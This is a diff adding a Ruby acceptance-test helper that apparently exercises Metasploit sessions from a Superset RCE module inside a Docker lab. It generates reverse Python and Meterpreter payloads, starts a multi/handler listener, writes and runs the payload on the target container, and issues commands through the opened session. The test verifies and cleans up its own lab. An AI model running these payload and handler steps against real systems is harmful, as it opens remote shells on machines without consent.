@@ -1,0 +1,132 @@
+# frozen_string_literal: true
+
+require 'base64'
+require 'digest'
+require 'English'
+require 'securerandom'
+require 'timeout'
+require_relative '../../../tools/dev/run_module_target_tests'
+
+module Acceptance
+  # Python's command shell creates a new subprocess per command. Its server can
+  # run in a web worker, so shutdown proves socket release rather than PID exit.
+  module SupersetRceSession
+    def python_poll(seconds, &block)
+      Timeout.timeout(seconds) { wait_for_expect(150, 0.1, &block) }
+    end
+
+    def python_listener_rows(port)
+      source = 'require "json"; port=Integer(ARGV.fetch(0)); rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map { |path| File.readlines(path).drop(1).map(&:split) }; puts JSON.generate(rows.select { |row| row[3]=="0A" && row[1].split(":").last.to_i(16)==port })'
+      JSON.parse(target_exec('framework', 'ruby', '-e', source, port.to_s))
+    end
+
+    def python_connections(port)
+      source = File.read('test/module_targets/superset_rce_owner/connection_state.py')
+      JSON.parse(target_exec('app', 'python', '-c', source, listener_host, port.to_s))
+    end
+
+    def python_fixture_command(argv, name)
+      path = File.join(target_runtime.fetch('artifacts'), "#{name}.log")
+      expect(ModuleTargetTests.new.send(:command, argv, path: path, timeout: 30, quiet: true)).to be(true)
+    end
+
+    def python_session_proof(session_id, payload, port, phase:)
+      meterpreter = payload.include?('meterpreter')
+      proof = "/tmp/module-target-superset-session-#{SecureRandom.hex(8)}"
+      record = { phase: phase, payload: payload, session_id: session_id, port: port, proof: proof }
+      begin
+        # Ask the live session for identity and make it perform an observable
+        # operation. Bind that PID to independently observed target socket FDs.
+        if meterpreter
+          output = console_command("sessions -i #{session_id} -C getpid")
+          pid = output[/Current pid: (\d+)/, 1]
+          output = console_command("sessions -i #{session_id} -C #{"execute -f /usr/bin/touch -a #{proof}".inspect}")
+        else
+          output = console_command("sessions -i #{session_id} -c #{"/usr/bin/touch #{proof}; printf 'SUPERSET_PYTHON_PID=%s\\n' \"$PPID\"".inspect}")
+          pid = output[/SUPERSET_PYTHON_PID=(\d+)/, 1]
+        end
+        expect(pid).not_to be_nil, output
+        expect(output).not_to match(/\[-\]|Exception|Unknown command/)
+        python_poll(15) { expect(target_exec('app', 'stat', '-c', '%u', proof).strip).to eq('1000') }
+        connections = python_connections(port)
+        expect(connections.flat_map { |row| row.fetch('owners') }).to include(include('pid' => pid.to_i, 'uid' => 1000))
+        record[:target_pid] = pid.to_i
+        record[:native_connections] = connections
+        shutdown = "framework.sessions[#{session_id}].#{meterpreter ? 'exit' : 'shell_close'}"
+        expect(console_command("irb -e #{shutdown.inspect}")).not_to match(/\[-\]|Exception|Unknown command/)
+        python_poll(20) { expect(python_connections(port)).to eq([]) }
+        python_poll(20) { expect(console_command('sessions -l')).to include('No active sessions') }
+        record[:socket_released] = true
+        record[:host_session_absent] = true
+      ensure
+        failure = $ERROR_INFO
+        record[:error] = { class: failure.class.name, message: failure.message } if failure
+        target_exec('app', 'rm', '-f', proof)
+        record[:proof_removed] = true
+        File.open(File.join(target_runtime.fetch('artifacts'), 'python-session-lifecycle.jsonl'), 'a') { |file| file.puts(JSON.generate(record)) }
+      end
+    end
+
+    def calibrate_python_payload(payload, port)
+      artifact = File.join(target_runtime.fetch('artifacts'), "native-python-#{port}.py")
+      remote = "/tmp/module-target-superset-native-#{port}.py"
+      record = { payload: payload, port: port, owner_calls: 0, passed: false }
+      begin
+        console_command('back')
+        console_command("use payload/#{payload}")
+        console_command("set LHOST #{listener_host}")
+        console_command("set LPORT #{port}")
+        generated = console_command("generate -f raw -o #{artifact}")
+        expect(generated).not_to match(/\[-\]|Exception|Unknown command/)
+        bytes = File.binread(artifact)
+        expect(bytes).not_to be_empty
+        record[:payload_bytes] = bytes.bytesize
+        record[:payload_sha256] = Digest::SHA256.hexdigest(bytes)
+        console_command('back')
+        console_command('use exploit/multi/handler')
+        console_command("set PAYLOAD #{payload}")
+        console_command("set LHOST #{listener_host}")
+        console_command("set LPORT #{port}")
+        console_command('set ExitOnSession false')
+        expect(console_command('run -j')).not_to include('[-]')
+        python_poll(15) { expect(python_listener_rows(port)).not_to be_empty }
+        # Docker cp assigns ownership outside the application's identity. Write
+        # the exact generated bytes as its real user so native cleanup can work.
+        writer = 'import base64,sys; from pathlib import Path; Path(sys.argv[1]).write_bytes(base64.b64decode(sys.argv[2], validate=True))'
+        target_exec('app', 'python', '-c', writer, remote, Base64.strict_encode64(bytes))
+        expect(target_exec('app', 'stat', '-c', '%u:%g', remote).strip).to eq('1000:1000')
+        python_fixture_command(target_runtime.fetch('compose') + ['exec', '-T', '-d', 'app', 'python', remote], "native-python-start-#{port}")
+        opened = nil
+        label = payload.include?('meterpreter') ? 'Meterpreter' : 'Command shell'
+        python_poll(35) do
+          sessions = console_command('sessions -l')
+          opened = sessions[/^\s*(\d+)\s+.*\b#{payload.include?('meterpreter') ? 'meterpreter' : 'shell'}\b/i, 1]
+          expect(opened).not_to be_nil, sessions
+          expect(console.all_data).to include("#{label} session #{opened} opened")
+        end
+        python_session_proof(opened, payload, port, phase: 'independent native calibration')
+        record[:session_id] = opened
+        record[:passed] = true
+      ensure
+        failure = $ERROR_INFO
+        record[:error] = { class: failure.class.name, message: failure.message } if failure
+        errors = []
+        [
+          ['sessions', -> { console_command('sessions -K') }],
+          ['jobs', -> { console_command('jobs -K') }],
+          ['payload', -> { target_exec('app', 'rm', '-f', remote) }],
+          ['target sockets', -> { python_poll(15) { expect(python_connections(port)).to eq([]) } }],
+          ['handler listeners', -> { python_poll(15) { expect(python_listener_rows(port)).to eq([]) } }]
+        ].each do |operation, cleanup|
+          cleanup.call
+        rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
+          errors << { operation: operation, class: e.class.name, message: e.message }
+        end
+        record[:cleanup_errors] = errors
+        record[:passed] = record[:passed] && !failure && errors.empty?
+        File.open(File.join(target_runtime.fetch('artifacts'), 'python-native-calibration.jsonl'), 'a') { |file| file.puts(JSON.generate(record)) }
+        raise "Native calibration cleanup failed: #{errors.inspect}" if !failure && !errors.empty?
+      end
+    end
+  end
+end
